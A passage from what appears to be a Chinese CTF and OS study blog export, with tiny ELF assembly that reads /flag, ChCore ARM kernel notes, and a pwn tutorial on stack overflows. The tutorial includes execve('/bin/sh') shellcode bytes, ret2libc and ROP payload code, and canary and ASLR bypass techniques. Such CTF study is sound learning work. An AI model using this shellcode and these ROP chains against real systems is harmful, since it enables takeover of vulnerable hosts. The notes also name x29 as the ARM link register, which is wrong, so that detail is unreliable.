class=\"line\">N=14</span><br><span class=\"line\">a=87005542023454150524855541144750166180919865766930052623463014576174554467821213957706498855559077927873140148579022102984237075640747995279989642832992188016154244525422278966269291094999255638208855482151405506938548578978626993952306016946318459909590778342355856153147577472731880392922408448351120608836436787309376542102861246758131059387213726386714147750943829877803608813501157597297132278662569590484844550173720257728957567960401433605097886634959342671140099728318480661981670113406848719025661715441498240565928452257694284734033186800579565313362313891643040303824890693074326810596828204114920499564539002024387811501676993037142024700539208458234538805837480373101259087885435757318639663667261597412600756998748849468402910307204633942748903285652463107201618869806410335014875125086076219328243935905232512517288787677039607942380387101187256890064827850683397174701574071447859273840130243421585240230546720814792141872637351043465819000677767263935304511294609746934407215686517293774009054989655225608925542221677606386577019926666519641600364567557194208313131276771325487167689236642467808540431881464601888142548664563650077494805488093052836193825650435423280004797008818023441669902387920463908641771270053841646139610358473027295405503333253535988771195991171826325976224803312343154770764448787106871066190163308337503496520787439022463066715315188820932966437067264819835942543744914754708785528560264636221600739219290648079243002368855133337672334702546690962019521762114649491890011821844552982141986770779324959379319663450035429876647739511502891515857175267046923938895240190738331037400875186816754190488884935451452912276673912555287036698557958114181944091831763987997170817657860587503942307866008409270543838849198648993460302655964709466390742236643982561028874558104072512842460862178322605890336695658154025228215730711703698453887</span><br><span class=\"line\">b=1709135102428266402521578879727820755289613552803360621456124607477236062710486518306973764485152792403836982447127607442256178602384138654630699081618087896504547452419077042758442686206419280715364719358444963157698332025374708249586554595335682851323392839386182223430638025377285183953532982335289152167960094778509135832533486573163055391161165455290050618906285941817273026009595891889257351919713796943557063702989409958711830323963904165120856027913035875447234054819209407636752170808481354455393229418385392070333249788177149805823305996401240529129269675319850189648765585143872927446631219018758183300260538575964857576326413621858004145085056968233978117291959507622980746386913195986770246828428505004660553304111935995749966702604925072694758649032383912238958853266784140206835764547417096028632172800108512761682168258638590405734443542959079348266711305636364545280494327703507925613838554455967641989345934135982107562442831339601728404946376557099963807693948972893157706474963068481053339310924790906172115918700323627413150856820444271874431985423216088592099275993135702445229813416554038919256687626967939077194814654296017340955433406979774456197892632603339550402577651543232076531854230456549500665301719274202267084848477851486963621280516840090062870783676271139503026167429223506897465592567885474737385462535970365299131640088862391408665388681336793214264999254388651074994672108064474559668817847730748402579997019473615639106089768908506811205164186682823067680169244405306578488165373356991213550493590509092039078377380748348705035457779199811755686614360447907451061901486558052283679831011812123254664108196829552904290039038174025870011733057320270633278578446021776430625193839865126802043272540967717004297030511020349356790240239389396001123955974292384351794841187054815564421183556415606663233835771297306290441383808134021392865157</span><br><span class=\"line\">c=35686662438826817213563656105539275101535697856185534149345343499844688924609645885022355135918404539985234360061600350189104933602381092051318547433998422974780849873203504443997848655625530623340371134341848128666616900144765579208079985990838064549216971926322724228681888830028303266068257138844044018255271435540077145919301591275738734597339459327150605278900738075092002974105991478458558870434061142265122382216368947373807069713709930176019498122168857679124768213308531786347567931187892878408434918309016688829685352835815066580725250947929501490665081644655994535671618967990757851510884824555077182679991403377524647154791971060789752020813552933450127083583289512848480063215680871789266871667712713169422322364887230502908301686924054210360219287364955960956032042950833997524453330328272059153308291883334074276913609077731735284223918404284292419020812011476995921011741346807748175931518235517265745772175162459312702479399232407706908845419443981643112692945551070592330727356541136923766994413647861488973051126611026148759432379003889674724917944805607605522248369290505402289434909292483537959789906318874307733003636212064338665528270372138914552950520981104343589517822223391222134534938052800801473344178058681643355234652680630054983022124146408518221588969589953072079556410755020859599503506797164705586073997208789455400263349566445512977221962882867406488146422316005409966253780701584170838345028112949069889795685718655327046530483250125959173355678292967658914005638877070834611505129167951369865542011417024870301563177370018869158755113622408743199140022326059195657852986370212647002055769249427919561331384755453850684244409515534188128908717886781958319756449082516858512445042864312213606923472603131125312862163489874095569215350848020642593339333668497345496027314732958586211664873526777590213207494911489341805851119668605552962767</span><br></pre></td></tr></table></figure>\n\n\n\n\n<h3 id=\"Tiny-ELF\"><a href=\"#Tiny-ELF\" class=\"headerlink\" title=\"Tiny ELF\"></a>Tiny ELF</h3><p>手写汇编 3个syscall 不过似乎32bit比64bit更剩空间一点<br><a href=\"https://www.ngui.cc/el/639055.html?action=onClick\">https://www.ngui.cc/el/639055.html?action=onClick</a><br>应该是下面这个 记不清了（下面有80bytes的版本）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.section .bss</span><br><span class=\"line\">.equ bufSIZE, 65535</span><br><span class=\"line\">.comm buf, bufSIZE</span><br><span class=\"line\"></span><br><span class=\"line\">.section .text</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string &quot;/flag&quot;</span><br><span class=\"line\">.globl _start</span><br><span class=\"line\"></span><br><span class=\"line\">_start:\tmovl $2,%eax</span><br><span class=\"line\">\tleaq\t.LC0(%rip),%rdi</span><br><span class=\"line\">\t//movq\t$0,%rsi</span><br><span class=\"line\">\tsyscall</span><br><span class=\"line\">\tmov \t%eax,%edi</span><br><span class=\"line\">\tleaq\t-80(%rsp),%rsi</span><br><span class=\"line\">\tmov \t$32,%dx</span><br><span class=\"line\">\txor \t%eax,%eax</span><br><span class=\"line\">\tsyscall</span><br><span class=\"line\">\tmovq    $1,%rdi</span><br><span class=\"line\">\tmov \t$1,%rax</span><br><span class=\"line\">\tsyscall</span><br><span class=\"line\"></span><br><span class=\"line\">mov $0x3c, %eax</span><br><span class=\"line\">mov $42, %edi</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Teensy-ELF\"><a href=\"#Teensy-ELF\" class=\"headerlink\" title=\"Teensy ELF\"></a>Teensy ELF</h3><p><a href=\"https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html\">https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html</a><br>不太懂具体原因 详细看elf文件格式可能得花很多时间 这里直接参考文章作者修改版和原版的对比尝试构造<br>一些可以优化的地方：</p>\n<ul>\n<li>fd的0 1 2分别对应stdin stdout stderr 所以新开的文件fd一定是3 write的系统调用号也是3 省去一次赋值</li>\n<li>open不需要第三个参数 可以提前把write的第三个参数值传好</li>\n<li>寄存器默认是0 都不用设置</li>\n<li>mov常数占用字节太多 用xor清空加inc dec等指令</li>\n</ul>\n<p>最后正好80bytes</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">;nasm -f bin -o tiny4.out tiny4.asm</span><br><span class=\"line\">  BITS 32</span><br><span class=\"line\"></span><br><span class=\"line\">\t        org     0x00010000</span><br><span class=\"line\"></span><br><span class=\"line\">\t        db      0x7F, &quot;ELF&quot;             ; e_ident</span><br><span class=\"line\">\t        dd      1                                       ; p_type</span><br><span class=\"line\">\t        dd      0                                       ; p_offset</span><br><span class=\"line\">\t        dd      $$                                      ; p_vaddr</span><br><span class=\"line\">\t        dw      2                       ; e_type        ; p_paddr</span><br><span class=\"line\">\t        dw      3                       ; e_machine</span><br><span class=\"line\">\t        dd      _start                  ; e_version     ; p_filesz</span><br><span class=\"line\">\t        dd      _start                  ; e_entry       ; p_memsz</span><br><span class=\"line\">\t        dd      4                       ; e_phoff       ; p_flags</span><br><span class=\"line\"></span><br><span class=\"line\">  _start:</span><br><span class=\"line\">\t        mov ebx,esp</span><br><span class=\"line\">            mov dl,0x20</span><br><span class=\"line\">            ; xor     eax,eax</span><br><span class=\"line\">\t        ; xor     ecx,ecx   ; str len       ; e_flags</span><br><span class=\"line\">\t        mov     al, 5   ; sys_write(fd, addr, len) : ebx, ecx, edx</span><br><span class=\"line\">\t        jmp     _next   ; jump to next part of the code</span><br><span class=\"line\">\t        dw      0x33                      ; e_ehsize</span><br><span class=\"line\">\t        dw      0x20                      ; e_phentsize</span><br><span class=\"line\">\t        dw      1                         ; e_phnum</span><br><span class=\"line\">  _next:        </span><br><span class=\"line\">            mov [esp],DWORD &#x27;/fla&#x27;</span><br><span class=\"line\">            mov [esp+4], WORD 0x0067</span><br><span class=\"line\">            int     0x80    ; syscall         ; e_shentsize</span><br><span class=\"line\">            mov ebx,eax</span><br><span class=\"line\">            mov ecx,esp</span><br><span class=\"line\">            ; mov edx,0x20</span><br><span class=\"line\">\t\t\tint 0x80</span><br><span class=\"line\">\t\t\tmov     al, 4</span><br><span class=\"line\">            dec ebx</span><br><span class=\"line\">            dec ebx</span><br><span class=\"line\">\t\t\tint 0x80</span><br><span class=\"line\"></span><br><span class=\"line\">            mov bl,42</span><br><span class=\"line\">\t        mov     al, 1   ; eax=1,sys_exit  ; e_shnum</span><br><span class=\"line\">\t        int     0x80    ; syscall         ; e_shstrndx</span><br><span class=\"line\"></span><br><span class=\"line\">  filesize      equ     $ - $$</span><br></pre></td></tr></table></figure>\n","categories":["ctf"]},{"title":"chcore-misc","url":"/2024/09/17/chcore/notes/","content":"<h1 id=\"chcore-misc\"><a href=\"#chcore-misc\" class=\"headerlink\" title=\"chcore-misc\"></a>chcore-misc</h1><h2 id=\"arm架构\"><a href=\"#arm架构\" class=\"headerlink\" title=\"arm架构\"></a>arm架构</h2><p><code>xxx_elk</code> k&#x3D;0 1 2 3 寄存器表示这个寄存器只能在elk的特权等级访问</p>\n<ul>\n<li>el0 用户进程</li>\n<li>el1 操作系统</li>\n<li>el2 虚拟化</li>\n<li>el3 trustzone</li>\n</ul>\n<p>call指令为bl 不使用栈 而是用寄存器<code>x29</code>作为link register <code>ret</code>时从LR中取返回地址</p>\n<p><code>SP_EL0</code> <code>SP_EL1</code> 不同特权等级用不同的栈寄存器 所以不需要放到栈中进行保存和恢复</p>\n<p><code>svc</code>进入内核</p>\n<p><code>eret</code>从当前特权等级k返回 返回地址在ELR_EL3  可以从el1到el0 也可以从el3到el1</p>\n<h2 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h2><p>树莓派启动</p>\n<ol>\n<li>通过树莓派厂商写死的GPU来初始化CPU</li>\n<li>firmware</li>\n<li>运行kernel.img  cpu从0x80000处执行第一行代码</li>\n</ol>\n<p>对于笔记本 用BIOS (basic input output system)  嵌入式设备（手机）不用BIOS</p>\n<p>将可启动设备(磁盘 MBR 0柱面0磁头0扇区 主引导扇区)512字节加载到0x7c00 然后执行 即bootloader</p>\n<p>x86 cpu reset后指向0xffff0地址 即bios物理地址</p>\n<h2 id=\"ChCore启动\"><a href=\"#ChCore启动\" class=\"headerlink\" title=\"ChCore启动\"></a>ChCore启动</h2><p>编译生成elf时需要排序所有.o 并且设置第一行指令在地址0x80000</p>\n<ol>\n<li><p>从elX切换到el1</p>\n</li>\n<li><p>初始化栈  栈实际上是c编译后的elf文件一个已经分配好的空间(4k) 只要把sp设置好就行</p>\n<p>由于arm架构使用link register保存返回地址 所以之前的函数调用没有嵌套 可以不需要栈</p>\n<p>对于c函数的编译器，并不认为这段c程序是内核初始化，所以仍会一样编译。即使不需要把返回地址压栈，也需要进行传参、寄存器保护等用栈的操作，所以一定要在调用c程序之前初始化好栈。</p>\n<p>当初始化好栈之后，完全可以用c语言而非汇编来编程，除非需要用到msr等系统isa指令</p>\n</li>\n<li><p>页表初始化</p>\n<p>ttbr：x86下的cr3  translation table base register</p>\n<p>只用48bit     0000+48bit ttbr0翻译；ffff+48bit ttbr1翻译  cpu根据虚拟地址前缀判断使用哪个翻译</p>\n<p>ttbr0和ttbr1都是_el1</p>\n<p>多级页表 ttbr0_el1_l0 指向ttbr0_el1_l1 指向ttbr0_el1_l2  都是数组 共512个entry 是下一级页表地址或物理地址 用一个bit记录</p>\n<p>4级页表  并不是只能最后一级指向物理地址，可以使用大页。这里初始化使用2M大页 之后会拆成4K</p>\n<p>虚拟内存最大256T</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>PTE</th>\n<th>指向物理内存大小</th>\n<th>index</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>L0</td>\n<td>L1地址</td>\n<td>512G</td>\n<td>9bit</td>\n</tr>\n<tr>\n<td>L1</td>\n<td>L2地址</td>\n<td>1G</td>\n<td>9bit</td>\n</tr>\n<tr>\n<td>L2</td>\n<td>L3地址</td>\n<td>2M</td>\n<td>9bit</td>\n</tr>\n<tr>\n<td>L3</td>\n<td>物理内存地址</td>\n<td>4k</td>\n<td>9bit</td>\n</tr>\n</tbody></table>\n<p>最后12bit是页偏移 VA与PA相同</p>\n<p>0-1G是物理地址，1G-4G是设备地址，设备地址的值随时会变化 所以不允许缓存 PTE64bit 除了记录物理地址的36bit(12bit偏移不需要) 其他bit可用作记录页信息 比如不同特权等级的读写权限</p>\n<p>将ttbr1与ttbr0的最后一级页表记录的物理地址范围设置成相同（0G到4G 每个entry2M）这样低地址与高地址的虚拟地址翻译会映射到同一块物理地址，执行相同的代码</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>VA</th>\n<th>PA</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ttbr0</td>\n<td>0G-1G</td>\n<td>0G-1G</td>\n</tr>\n<tr>\n<td>ttbr1</td>\n<td>0xffffff0000000000 ,1G</td>\n<td>0G-1G</td>\n</tr>\n</tbody></table>\n</li>\n<li><p>开启mmu （设置<code>sctlr_el1</code>寄存器的某些bit）从下一条指令开始cpu会自动做地址翻译</p>\n<p>应用程序跑在低地址 操作系统跑在高地址 start_kernal从0xffffff0000000000开始</p>\n<p>内核高地址 由ttbr1翻译 得到相同PA</p>\n<p>应用程序低地址 由ttbr0翻译 得到不同PA</p>\n</li>\n<li><p>初始化异常向量表 每一项对应一个函数地址(汇编)</p>\n<p>对于syscall这个同步异常，构建syscall table 每个系统调用号对应一个函数(void*)</p>\n</li>\n</ol>\n<h2 id=\"VA\"><a href=\"#VA\" class=\"headerlink\" title=\"VA\"></a>VA</h2><p>天然隔离性好</p>\n<p>每个CPU核有一个TLB 作为页表的缓存</p>\n<ul>\n<li><p>进程切换 刷TLB</p>\n<p>ASID TLB与页表同时记录 这样就不需要每次刷</p>\n</li>\n<li><p>修改页表映射 刷TLB (修改页表映射操作的内存使用的缓存并不是TLB TLB是缓存查找PA)</p>\n</li>\n<li><p>如果其他核也运行了当前进程 则其他核TLB也需要刷</p>\n</li>\n</ul>\n<h2 id=\"PA\"><a href=\"#PA\" class=\"headerlink\" title=\"PA\"></a>PA</h2><p>开启地址翻译后，物理地址实际上也不可见 不可管理了</p>\n<p>内核映射到高地址段，通过分配高地址段的虚拟空间来管理实际的物理内存</p>\n<p>buddy system存在于内核的虚拟空间中 但映射到真实的物理内存 从而进行管理</p>\n<p>用户态需要的虚拟空间经过buddy system分配 所以物理内存上的每个page可能会对应两个虚拟地址，但是内核自己只负责管理，是不会修改的，如果出bug了修改用户空间 称为踩内存</p>\n<p>buddy system实际上占用的内存只有metadata，每个物理页会对应一个page数据结构  记录物理页实际大小，需要访存修改的只有metadata 而操作的物理页地址实际上是虚拟地址，并且只需要根据虚拟地址找到metadata和buddy 并不需要访问内容，所以即使内核的start_addr指向的虚拟空间部分并没有映射到真实物理空间也没有关系。</p>\n<h2 id=\"page-table\"><a href=\"#page-table\" class=\"headerlink\" title=\"page table\"></a>page table</h2><p>所有page都是通过buddy_system拿到的，都是虚拟地址，存PTE时需要转换成物理地址</p>\n<p>PTE需要按给定格式存，最后一位是valid，硬件通过这个bit判断是否缺页(异常，给内核处理)</p>\n<p>如果需要换页，只要valid为0触发缺页，其他bit全自己定义即可，与硬件无关</p>\n<p>mmu访问时会改pte的access bit 方便换页策略</p>\n<p>换页需要有反向映射 修改所有映射到被换出的物理页的虚拟页的PTE</p>\n<h2 id=\"programe\"><a href=\"#programe\" class=\"headerlink\" title=\"programe\"></a>programe</h2><p><code>create_root_thread</code>创建进程 同时创建线程</p>\n<ul>\n<li>进程：创建pmo，加载二进制文件，地址映射</li>\n<li>线程：线程上下文，加入调度队列</li>\n</ul>\n<p>对于spawn创建线程，自己加载好二进制，通过各种系统调用拿到pmo，地址映射，创建线程</p>\n<h2 id=\"线程\"><a href=\"#线程\" class=\"headerlink\" title=\"线程\"></a>线程</h2><p>进程的地址空间，包含共享的堆，不同线程的内核栈和线程栈（用户态）</p>\n<p>chcore中，内核栈地址即为kmalloc拿到的thread结构体的地址，访问thread结构体的成员正好是在内存中栈的对应位置</p>\n<p>而线程栈是用户在发出创建线程时手动指定的。内核中的代码sp均为内核栈地址，用户态地址在指定后存在sp_el0中，上下文切换时保存恢复，eret后sp为此地址</p>\n","categories":["chcore"]},{"title":"pwn","url":"/2024/09/17/ctf/pwn/","content":"<h1 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h1><p>对方给你远程执行一个程序 你需要控制对方计算机</p>\n<ol>\n<li>发现漏洞 更改控制流</li>\n<li>找执行system(“&#x2F;bin&#x2F;sh”)的方式</li>\n</ol>\n<ul>\n<li>file 看文件类型 32还是64</li>\n<li>用ida看反编译</li>\n<li>checksec 看保护</li>\n<li>objdump -d file &gt; asm.txt 看汇编</li>\n</ul>\n<h2 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h2><p><a href=\"https://github.com/skysider/pwndocker\">skysider&#x2F;pwndocker: A docker environment for pwn in ctf (github.com)</a></p>\n<p>gdb pwntools</p>\n<p>如果运行二进制报libc版本的错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>添加高版本的源</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">deb http://th.archive.ubuntu.com/ubuntu jammy main    #添加该行到文件</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>运行升级</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install libc6</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"栈溢出-stackoverflow\"><a href=\"#栈溢出-stackoverflow\" class=\"headerlink\" title=\"栈溢出(stackoverflow)\"></a>栈溢出(stackoverflow)</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> s[size];</span><br><span class=\"line\">gets(s);</span><br></pre></td></tr></table></figure>\n\n<p>gets不限制长度 read长度不匹配</p>\n<p>汇编</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">push ebp</span><br><span class=\"line\">mov esp,ebp</span><br><span class=\"line\">sub esp,size</span><br><span class=\"line\">...</span><br><span class=\"line\">call gets</span><br><span class=\"line\">add esp,size</span><br><span class=\"line\">...</span><br><span class=\"line\">leave  (mov ebp,esp  /  pop ebp)</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n\n<p>32位：覆盖size+4</p>\n<ul>\n<li><p>system(‘bin&#x2F;sh’) 或 execve(‘bin&#x2F;sh’,0,0) 都可以  </p>\n</li>\n<li><p>system有时候要求栈16地址对齐  但有时候满足了还是会出错</p>\n</li>\n<li><p>execve二 三个参数不设置可能也可以 （看运气）</p>\n</li>\n<li><p>本地调试的环境和libc会和远程有差异</p>\n</li>\n</ul>\n<h3 id=\"phase-1\"><a href=\"#phase-1\" class=\"headerlink\" title=\"phase 1\"></a>phase 1</h3><p>程序中存在system(“&#x2F;bin&#x2F;sh”)函数 直接把这个函数的地址覆盖至栈上的retaddr</p>\n<h3 id=\"phase-2\"><a href=\"#phase-2\" class=\"headerlink\" title=\"phase 2\"></a>phase 2</h3><p>程序中不存在system函数 在栈上写shellcode  把栈的起始地址覆盖至栈上的retaddr 执行shellcode</p>\n<p><code>b&quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80&quot;</code></p>\n<h3 id=\"phase-3\"><a href=\"#phase-3\" class=\"headerlink\" title=\"phase 3\"></a>phase 3</h3><p>栈地址随机化 只能把shellcode写到另一块地方(确定的地址) 然后更改执行流至这个确定的地址</p>\n<p>这个地址必须是可以写入数据的  text段不允许写入数据  data段可以</p>\n<p><code>readelf -S findshellcode</code>可以查看 (栈地址随机化 text段和data段地址确定)</p>\n<p>利用两次read</p>\n<ul>\n<li><p>第一次 ：栈溢出 布置栈</p>\n<p><code>pad + p32(read_addr) + p32(shellcode_addr)+p32(0)+p32(shellcode_addr)+p32(0x80)</code></p>\n<p>最后三个是read的参数 分别是stdin 写入地址 写入字节数</p>\n</li>\n<li><p>第二次：发送shellcode（加\\x00中止）</p>\n</li>\n</ul>\n<p>int 80 软中断原理：<a href=\"https://blog.csdn.net/xiaominthere/article/details/17287965\">Linux系统调用 int 80h int 0x80_xiaominthere的专栏-CSDN博客</a></p>\n<h3 id=\"phase-4\"><a href=\"#phase-4\" class=\"headerlink\" title=\"phase 4\"></a>phase 4</h3><p>程序中不存在system函数 栈不可执行 利用libc里的system函数和&#x2F;bin&#x2F;sh字符串</p>\n<p>plt 局部 别人写的库 你程序里用到了  你程序里会有一个这个函数的地址 不是真实的 会直接跳到got中</p>\n<p>got 全局 但是记录的是偏移</p>\n<p>真实地址 &#x3D; 基地址 + 偏移地址  </p>\n<p>目标：拿到基地址与偏移地址 计算system与”&#x2F;bin&#x2F;sh”的真实地址</p>\n<ul>\n<li><p>偏移地址：可由一个确定版本的libc库决定 （本地调试的时候会使用本地环境的libc导致问题）</p>\n<ul>\n<li><p>题目给了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">    libc = ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>)</span><br><span class=\"line\">    func_offset = libc.symbols[<span class=\"string\">&#x27;func&#x27;</span>]</span><br><span class=\"line\">    str_offset = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class=\"line\">  - 题目没给</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    ```python</span><br><span class=\"line\">    libc = LibcSearcher(<span class=\"string\">&#x27;func&#x27;</span>,func_addr)<span class=\"comment\">#泄露的真实地址</span></span><br><span class=\"line\">    func_offset = libc.dump(<span class=\"string\">&#x27;func&#x27;</span>)</span><br><span class=\"line\">    str_offset = libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">- 基地址 = 真实地址 - 偏移地址  </span><br><span class=\"line\"></span><br><span class=\"line\">  `elf = ELF(<span class=\"string\">&#x27;./elf&#x27;</span>)`</span><br><span class=\"line\"></span><br><span class=\"line\">  - 需要一个在漏洞前已经执行过的函数(__libc_start_main  puts) 拿到它的真实地址</span><br><span class=\"line\"></span><br><span class=\"line\">    `puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]`</span><br><span class=\"line\"></span><br><span class=\"line\">  - 需要puts/write或其他输出的函数 把真实地址传过来</span><br><span class=\"line\"></span><br><span class=\"line\">    `puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]`</span><br><span class=\"line\"></span><br><span class=\"line\">  - 需要一个可以二次利用栈溢出的地址</span><br><span class=\"line\"></span><br><span class=\"line\">    ```python</span><br><span class=\"line\">    main = <span class=\"number\">0x123456</span><span class=\"comment\">#真实地址</span></span><br><span class=\"line\">    main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>根据call的参数对寄存器或栈的要求 布置好内容</p>\n<p><code>payload1 = pad + p32(puts_plt) + p32(main) + p32(puts_got)</code></p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">puts_addr = u32(p.recv()[:4])</span><br><span class=\"line\">base_addr = puts_addr - puts_offset</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>最后根据地址布置好栈 调用</p>\n<p><code>payload2 = pad + p32(system_addr) + pad4 + p32(binsh_addr)</code></p>\n<p>pad4是调用system的时候push进去的retaddr binsh_addr是第一个参数</p>\n<h3 id=\"phase-5-保护全开\"><a href=\"#phase-5-保护全开\" class=\"headerlink\" title=\"phase 5 (保护全开)\"></a>phase 5 (保护全开)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rsp--&gt;  buf</span><br><span class=\"line\">...</span><br><span class=\"line\">rbp-8--&gt;  canary</span><br><span class=\"line\">rbp  --&gt;  saved rbp</span><br><span class=\"line\">rbp+8 --&gt; retaddr</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"绕过canary\"><a href=\"#绕过canary\" class=\"headerlink\" title=\"绕过canary\"></a>绕过canary</h4><p>canary为了防止被输出 最低位通常为0x0，用于截断字符串</p>\n<p>栈溢出时覆盖一位即可，可以拿到canary及其他数据</p>\n<h4 id=\"绕过ASLR-PIE\"><a href=\"#绕过ASLR-PIE\" class=\"headerlink\" title=\"绕过ASLR PIE\"></a>绕过ASLR PIE</h4><p>所有地址都是随机的，但是可以通过泄露的方式拿到</p>\n<ul>\n<li>泄露saved rbp 拿到stack地址</li>\n<li>泄露retaddr 拿到text地址</li>\n<li>main函数的retaddr里存放了__libc_start_main+243</li>\n</ul>\n<p>低12位不会被随机 可以用 <code>addr_leak &gt;&gt; 12 &lt;&lt; 12 | (addr &amp; 0xfff)</code>的方式配合ida获得任意地址</p>\n<p>或者直接partial write 只覆盖低12位</p>\n<h4 id=\"绕过NX-（ROP）\"><a href=\"#绕过NX-（ROP）\" class=\"headerlink\" title=\"绕过NX （ROP）\"></a>绕过NX （ROP）</h4><p><code>ROPgadget --binary rop_x64</code> 展示所有的gadgets</p>\n<p>栈不可执行，或栈地址随机化 </p>\n<p>只能执行其他确定地址上的任意代码，可以根据一些gadget配合栈的布置构造函数的调用</p>\n<p>以_libc_csu_init  64bit为例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class=\"line\">.text:00000000004005C0                 public __libc_csu_init</span><br><span class=\"line\">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o</span><br><span class=\"line\">.text:00000000004005C0                 push    r15</span><br><span class=\"line\">.text:00000000004005C2                 push    r14</span><br><span class=\"line\">.text:00000000004005C4                 mov     r15d, edi</span><br><span class=\"line\">.text:00000000004005C7                 push    r13</span><br><span class=\"line\">.text:00000000004005C9                 push    r12</span><br><span class=\"line\">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class=\"line\">.text:00000000004005D2                 push    rbp</span><br><span class=\"line\">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">.text:00000000004005DA                 push    rbx</span><br><span class=\"line\">.text:00000000004005DB                 mov     r14, rsi</span><br><span class=\"line\">.text:00000000004005DE                 mov     r13, rdx</span><br><span class=\"line\">.text:00000000004005E1                 sub     rbp, r12</span><br><span class=\"line\">.text:00000000004005E4                 sub     rsp, 8</span><br><span class=\"line\">.text:00000000004005E8                 sar     rbp, 3</span><br><span class=\"line\">.text:00000000004005EC                 call    _init_proc</span><br><span class=\"line\">.text:00000000004005F1                 test    rbp, rbp</span><br><span class=\"line\">.text:00000000004005F4                 jz      short loc_400616</span><br><span class=\"line\">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class=\"line\">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class=\"line\">.text:0000000000400600</span><br><span class=\"line\">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j</span><br><span class=\"line\">.text:0000000000400600                 mov     rdx, r13</span><br><span class=\"line\">.text:0000000000400603                 mov     rsi, r14</span><br><span class=\"line\">.text:0000000000400606                 mov     edi, r15d</span><br><span class=\"line\">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class=\"line\">.text:000000000040060D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class=\"line\">.text:0000000000400614                 jnz     short loc_400600</span><br><span class=\"line\">.text:0000000000400616</span><br><span class=\"line\">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j</span><br><span class=\"line\">.text:0000000000400616                 add     rsp, 8</span><br><span class=\"line\">.text:000000000040061A                 pop     rbx</span><br><span class=\"line\">.text:000000000040061B                 pop     rbp</span><br><span class=\"line\">.text:000000000040061C                 pop     r12</span><br><span class=\"line\">.text:000000000040061E                 pop     r13</span><br><span class=\"line\">.text:0000000000400620                 pop     r14</span><br><span class=\"line\">.text:0000000000400622                 pop     r15</span><br><span class=\"line\">.text:0000000000400624                 retn</span><br><span class=\"line\">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>\n\n<p>可以通过如下方法执行任意函数并给三个参数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">csu</span>(<span class=\"params\">rbx,rbp,r12,r13,r14,r15,addr</span>):</span><br><span class=\"line\">    <span class=\"comment\"># rdi = r15, rsi = r14, rdx = r13</span></span><br><span class=\"line\">    <span class=\"comment\"># r12 = addr of function want to call</span></span><br><span class=\"line\">    <span class=\"comment\"># rbx should be 0 and rbp should be 1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;A&#x27;</span> * pad + p64(fake_ebp)</span><br><span class=\"line\">    <span class=\"comment\">#ret</span></span><br><span class=\"line\">    payload += p64(csu_part2_addr) </span><br><span class=\"line\">    <span class=\"comment\">#pop rbx rbp r12 r13 r14 r15</span></span><br><span class=\"line\">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + 